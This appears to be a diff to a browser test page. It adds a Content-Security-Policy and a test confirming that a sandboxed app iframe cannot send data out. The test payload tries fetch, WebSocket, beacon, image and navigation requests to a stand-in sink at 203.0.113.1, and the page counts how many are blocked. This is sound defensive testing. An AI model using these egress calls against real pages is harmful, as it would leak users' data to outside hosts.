@@ -1,5 +1,6 @@
 <!doctype html>
 <meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'self'; img-src 'self' data:; frame-src 'self'; base-uri 'none'; form-action 'none'">
 <title>visual check</title>
 <style>
   body { font: 14px ui-monospace, Menlo, monospace; margin: 2rem; max-width: 46rem; }
@@ -80,11 +81,35 @@ const probeHtml = `<!doctype html><meta charset="utf-8"><p>probe</p><script>
 })();
 <\/script>`;
 
+const EGRESS = 5;
+const SINK = "http://203.0.113.1";
+const egressHtml = `<!doctype html><meta charset="utf-8"><p>egress</p><script>
+const lines = [];
+document.addEventListener("securitypolicyviolation", (event) => {
+  lines.push("csp " + event.violatedDirective + " " + event.blockedURI);
+});
+try { fetch("${SINK}/fetch").catch(() => {}); } catch (error) { lines.push("fetch threw " + error.name); }
+try { new WebSocket("ws://203.0.113.1/socket"); } catch (error) { lines.push("websocket threw " + error.name); }
+try { navigator.sendBeacon("${SINK}/beacon", "x"); } catch (error) { lines.push("beacon threw " + error.name); }
+const image = new Image();
+image.src = "${SINK}/image.png";
+setTimeout(() => {
+  parent.postMessage({ egress: lines }, "*");
+  location.assign("${SINK}/navigate");
+}, 300);
+<\/script>`;
+
+let hostFrameSrcViolations = 0;
+document.addEventListener("securitypolicyviolation", (event) => {
+  log("host csp " + event.violatedDirective + " " + event.blockedURI);
+  if (event.violatedDirective === "frame-src") hostFrameSrcViolations += 1;
+});
+
 const canvas = document.getElementById("canvas");
 mount(canvas);
 receive({ type: "app.push", seq: 100, id: "probe", html: probeHtml });
 const frames = canvas.querySelectorAll("iframe");
-const appFrame = frames[frames.length - 1];
+let appFrame = frames[frames.length - 1];
 log(
   "app frame: sandbox=" + appFrame.getAttribute("sandbox") +
   " allow=" + appFrame.getAttribute("allow") +
@@ -103,5 +128,36 @@ window.addEventListener("message", (event) => {
   log(blocked === PROBES && event.data.length === PROBES
     ? "probe: " + PROBES + " of " + PROBES + " blocked"
     : "probe: " + blocked + " of " + PROBES + " blocked, FAIL");
+  receive({ type: "app.push", seq: 101, id: "egress", html: egressHtml });
+  const pushed = canvas.querySelectorAll("iframe");
+  appFrame = pushed[pushed.length - 1];
+});
+
+window.addEventListener("message", (event) => {
+  if (event.source !== appFrame.contentWindow) return;
+  if (typeof event.data !== "object" || event.data === null) return;
+  if (!Array.isArray(event.data.egress)) return;
+  let connect = 0;
+  let img = 0;
+  for (const line of event.data.egress) {
+    log(String(line));
+    if (typeof line !== "string") continue;
+    if (line.startsWith("csp connect-src")) connect += 1;
+    if (line.startsWith("csp img-src")) img += 1;
+  }
+  setTimeout(() => {
+    if (hostFrameSrcViolations === 0) log("egress: navigation ESCAPED");
+    const blocked = connect + img + (hostFrameSrcViolations > 0 ? 1 : 0);
+    log("egress: " + blocked + " of " + EGRESS + " blocked" + (blocked === EGRESS ? "" : ", FAIL"));
+    receive({ type: "diagram.push", seq: 102, id: "check", kind: "flowchart", source: "graph TD; a-->b" });
+  }, 500);
+});
+
+window.addEventListener("message", (event) => {
+  if (event.source !== canvas.querySelector("iframe").contentWindow) return;
+  if (typeof event.data !== "object" || event.data === null) return;
+  if (event.data.seq !== 102) return;
+  log(event.data.ok === true ? "diagram: ok" : "diagram: FAIL");
+  log("done");
 });
 </script>
